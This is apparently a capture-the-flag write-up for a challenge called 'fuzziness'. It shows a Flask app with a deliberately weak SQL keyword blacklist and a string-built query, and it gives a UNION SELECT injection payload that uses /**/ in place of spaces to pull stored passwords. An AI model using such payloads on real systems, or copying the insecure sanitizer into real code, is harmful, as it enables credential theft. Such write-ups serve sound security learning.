# fuzziness

## problem

I'm tired of SQLi - I'll just keep checking and checking and checking, until I'm certain there are no more evil words.

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/7f1e6633-8882-4023-99df-bf3e288e2b9c)

```py
#!/usr/bin/env python3

from sqlite3 import *
from os import system
from flask import Flask, request, Response
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
app = Flask(__name__)
limiter = Limiter(
    get_remote_address,
    app=app,
    default_limits=["50000 per hour"],
    storage_uri="memory://",
)

RESERVED = sorted([i.lower().strip() for i in open("sqlite_reserved.txt")], key=len, reverse=True)

def check(s):
    return any(keyword in s.split() for keyword in RESERVED)

def sanitize(s):
    s = s.lower()
    while check(s):
        for keyword in RESERVED:
            s = s.replace(keyword, '')
    return s

@app.route('/', methods=["GET"])
@limiter.limit("2/second")
def index():
    if 'lastname' not in request.args:
        return open("index.html").read()
    else:
        con = connect("users.db")
        cur = con.cursor()
        lastname = sanitize(request.args['lastname'])
        res = cur.execute(f"SELECT * from authors where last LIKE '%{lastname}%'")
        ret = '<table>'
        ret += '<tr><th>First Name</th> <th>Middle Name</th> <th>Last Name</th></tr>'
        for row in res:
            ret += '<tr>'
            for entry in row:
                ret += f"<td>{entry}</td>"
            ret += '</tr>'
        ret += '</table>'
        return ret

@app.route('/source')
@limiter.limit("2/second")
def source():
    return Response(open(__file__).read(), mimetype="text/plain")

@app.route('/blacklist')
@limiter.limit("2/second")
def blacklist():
    return Response(open("sqlite_reserved.txt").read(), mimetype="text/plain")

if __name__ == "__main__":
    con = connect(":memory:")
    cur = con.cursor()
    cur.execute('''
        CREATE TABLE authors(first, middle, last)
    ''')
    cur.execute('''
        INSERT INTO authors VALUES
            ("Tobias", '', "Smollett"),
            ("William", '', "Shakespeare"),
            ("Edward", "Morgan", "Forster"),
            ("George", "", "Eliot"),
            ("Louisa", "May", "Alcott"),
            ("Lucy", "Maud", "Montgomery"),
            ("Frank", "T.", "Merill"),
            ("Herman", "", "Melville"),
            ("Alexandre", "", "Dumas"),
            ("Elizabeth", "", "Von Arnim")
    ''')
    cur.execute('''
        CREATE TABLE users(username, passwords)
    ''')
    cur.execute(f'''
        INSERT INTO users VALUES
            ("admin", "{open("flag.txt").read()}")
    ''')
    con.commit()
    cur.close()
    con.close()

    app.run('0.0.0.0', 14002)
```

## solution

the issue is in the check function

```py
def check(s):
    return any(keyword in s.split() for keyword in RESERVED)
```

we check if the keyword is in the split version of the string, and by default, the split string is split by spaces, which means that we can remove some of the spaces to get SQLi

the payload `' UNION/**/SELECT null,username,passwords /**/FROM users; --` seems to do the trick because the full command is `SELECT * from authors where last LIKE '%' union/**/select null,username,passwords /**/from users; --%'`

this works because the split version of our payload is `["'", 'UNION/**/SELECT', 'null,username,passwords', '/**/FROM', 'users;', '--']`, and for example, the reserved keyword `SELECT` is not inside of the list, even though `UNION/**/SELECT` is inside of the list.
